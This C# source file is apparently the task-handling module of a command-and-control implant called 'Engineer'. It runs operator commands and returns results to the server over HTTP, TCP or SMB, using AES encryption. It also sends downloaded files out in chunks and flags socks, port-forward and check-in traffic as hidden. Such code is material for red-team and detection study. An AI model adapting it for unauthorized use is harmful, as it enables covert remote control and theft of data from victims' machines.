using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Engineer.Commands;
using System.Collections.Concurrent;
using System.Threading;
using DynamicEngLoading;

namespace Engineer.Functions
{
    public class Tasking
    {
        public static ConcurrentDictionary<string, EngineerTaskResult> engTaskResultDic = new(); // key is the task id and value is the whole task
        public static ConcurrentDictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task
        public static ConcurrentDictionary<string,CancellationTokenSource> cancellationTokenSourceDic = new();

        public static void DealWithTasks(IEnumerable<EngineerTask> tasks)
        {
            try
            {
                foreach (var task in tasks)
                {
                    // Create a new CancellationTokenSource for the task
                    CancellationTokenSource cts = new CancellationTokenSource();
                    // Update the task's cancelToken property with the CancellationToken from the CancellationTokenSource
                    task.cancelToken = cts.Token;

                    cancellationTokenSourceDic.TryAdd(task.Id, cts);
                    //if task.IsBlocking is true then we need to wait for the task to finish before we can continue
                    if (task.IsBlocking)
                    {
                        // Console.WriteLine("Blocking task executing");
                        DealWithTask(task);
                    }
                    else
                    {
                        //if task.IsBlocking is false then we can just start the task and continue
                        Task.Run(async () => await DealWithTask(task));
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        public static async Task DealWithTask(EngineerTask task)
        {
            try
            {
                //add task to engTaskDic
                engTaskDic.TryAdd(task.Id, task);

                //make an EngineerTaskResult 
                var taskResult = new EngineerTaskResult
                {
                    Id = task.Id,
                    Command = task.Command,
                    Result = "".JsonSerialize(),
                    IsHidden = false,
                    Status = EngTaskStatus.Running,
                    ResponseType = TaskResponseType.None,
                    EngineerId = Program._metadata.Id
                };

                var command = Program._commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.CurrentCultureIgnoreCase)); //this should then take input and match too cmd list
                if (command is null)
                {
                    var result = "Error: Command not found";
                    taskResult.Result = result.JsonSerialize();
                    taskResult.Command = task.Command;
                    taskResult.Status = EngTaskStatus.Failed;
                    taskResult.ResponseType = TaskResponseType.String;
                    SendTaskResult(taskResult,false);
                    //Program.SendTaskResult(task.Id, result, false, EngTaskStatus.Failed);  //task we send in still has all properties including Id
                }
                else
                {
                    AddTaskResult(taskResult);
                    var result = command.Execute(task);
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine(ex.Message);
               Console.WriteLine(ex.StackTrace);
            }  
        }

        public static void AddTaskResult(EngineerTaskResult taskResult)
        {
            if (!engTaskResultDic.ContainsKey(taskResult.Id))
            { 
                engTaskResultDic.TryAdd(taskResult.Id, taskResult);
            }
        }

        public static void FillTaskResults(object output, EngineerTask task,EngTaskStatus taskStatus, TaskResponseType taskResponseType)
        {
            try
            {
                if (engTaskResultDic.ContainsKey(task.Id))
                {
                    if(TaskResponseType.String == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as string).JsonSerialize();
                    }
                    else if(TaskResponseType.FileSystemItem == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as List<FileSystemItem>).JsonSerialize();
                    }
                    else if(TaskResponseType.ProcessItem == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as List<ProcessItem>).JsonSerialize();
                    }
                    else if(TaskResponseType.TokenStoreItem == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as List<TokenStoreItem>).JsonSerialize();
                    }
                    else
                    {
                        engTaskResultDic[task.Id].Result = (output as byte[]);
                    }
                    engTaskResultDic[task.Id].Status = taskStatus;
                    engTaskResultDic[task.Id].ResponseType = taskResponseType;
                    
                    //if command is download then call the Functions.DownloadTracker.SplitFileString function, get the filename from the task.Arguments, and pass the result to the function
                    if (task.Command.Equals("download", StringComparison.CurrentCultureIgnoreCase))
                    {
                        if (engTaskResultDic[task.Id].Status == EngTaskStatus.Complete)
                        {
                            var fileParts = Functions.DownloadTracker.SplitFileString(engTaskResultDic[task.Id].Result);
                            //send each value from the key that matches the filename variable in _downloadedFileParts to the server
                            foreach (var value in fileParts)
                            {
                                engTaskResultDic[task.Id].Result = value.JsonSerialize();
                                SendTaskResult(engTaskResultDic[task.Id], true);
                            }
                        }
                        else
                        {
                            SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                        }
                    }
                    //if Command name is ConnectSocks, SendSocks, ReceiveSocks send a true for ishidden
                    else if (task.Command.Equals("socksConnect", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksSend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
                    {
                        engTaskResultDic[task.Id].IsHidden = true;
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    else if (task.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
                    {
                        engTaskResultDic[task.Id].IsHidden = true;
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    else if (task.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
                    {
                        engTaskResultDic[task.Id].IsHidden = true;
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    else if (task.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportRecieve", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
                    {
                        engTaskResultDic[task.Id].IsHidden = true;
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    else if (task.Command.Equals("canceltask", StringComparison.CurrentCultureIgnoreCase))
                    {
                        engTaskResultDic[task.Id].IsHidden = false;
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    else if (task.Command.Equals("UpdateTaskKey", StringComparison.CurrentCultureIgnoreCase))
                    {
                        engTaskResultDic[task.Id].IsHidden = true;
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    else
                    {
                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                    }
                    if (engTaskResultDic[task.Id].Status != EngTaskStatus.Running)
                    {
                        //if task is not running then remove it from the dictionary to save memory
                        Thread.Sleep(100);
                        engTaskResultDic.TryRemove(task.Id, out _);
                        engTaskDic.TryRemove(task.Id, out _);
                    }
                }
                
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }
        
        public static void SendTaskResult(EngineerTaskResult taskResult, bool isDataChunked)
        {
            try
            {
                var NewtaskResult = new EngineerTaskResult
                {
                    Id = taskResult.Id,
                    Command = taskResult.Command,
                    Result = taskResult.Result,
                    IsHidden = taskResult.IsHidden,
                    Status = taskResult.Status,
                    EngineerId = taskResult.EngineerId,
                    ResponseType = taskResult.ResponseType,
                };
                if (Program.ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase))
                {
                    //Console.WriteLine("is http calling send data");
                    Program._commModule.SentData(NewtaskResult, isDataChunked);
                }

                else if (Program.ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                {
                    //Console.WriteLine("is tcp seralizing task result");
                    IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                    var SeraliedTaskResult = tempResult.JsonSerialize();
                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
                    //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                    Task.Run(async () => await Program._commModule.P2PSent(encryptedTaskResult));
                }

                else if (Program.ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                {
                    IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                    var SeraliedTaskResult = tempResult.JsonSerialize();
                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
                    //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                    Task.Run(async () => await Program._commModule.P2PSent(encryptedTaskResult));
                }

                if (isDataChunked)
                {
                    //if we are sending data back in chunks we need to wait until the current one is sent before sending the next one
                    Thread.Sleep(EngCommBase.Sleep);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }
    }
}
